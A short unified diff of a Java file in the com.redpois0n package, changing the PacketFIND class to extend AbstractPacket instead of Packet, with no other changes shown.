@@ -6,7 +6,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.Search;
 
 
-public class PacketFIND extends Packet {
+public class PacketFIND extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
